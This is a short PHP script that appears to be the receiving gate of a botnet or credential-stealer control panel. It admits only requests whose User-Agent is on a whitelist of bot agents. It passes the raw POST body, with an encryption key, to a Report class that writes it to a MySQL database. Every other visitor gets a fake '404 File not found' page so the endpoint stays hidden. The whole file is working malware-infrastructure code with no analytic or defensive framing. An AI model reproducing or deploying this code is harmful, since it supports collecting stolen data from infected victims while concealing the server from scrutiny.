<?php
	define("CONFIG_FILE", "config.inc.php");
	
	ob_start();
	if(file_exists(CONFIG_FILE))
	{
		require_once(CONFIG_FILE);
		require_once(INCLUDE_."/class/misc.class.php");
		require_once(INCLUDE_."/class/worker.class.php");
		require_once(INCLUDE_."/class/mysqli.class.php");
		
		if (isset($White_BotAgents_Lists) && is_array($White_BotAgents_Lists))
		{
			if ((count($White_BotAgents_Lists) && array_search($_SERVER['HTTP_USER_AGENT'], $White_BotAgents_Lists, TRUE) === FALSE))
			{
				header("HTTP/1.0 404 Not Found");
				header("Status: 404 Not Found");
				$_SERVER['REDIRECT_STATUS'] = 404;
				
				die("File not found.");
			}
		}
		
		ob_end_clean();

		if(isset($_SERVER['CONTENT_LENGTH']))
		{
			$Report = new Report($DBData, file_get_contents('php://input'), intval($_SERVER['CONTENT_LENGTH']), ENCKEY_, TEMP_);
			$Report = NULL;
		}
	}

	header("HTTP/1.0 404 Not Found");
    header("Status: 404 Not Found");
    $_SERVER['REDIRECT_STATUS'] = 404;
	
	die("File not found.");
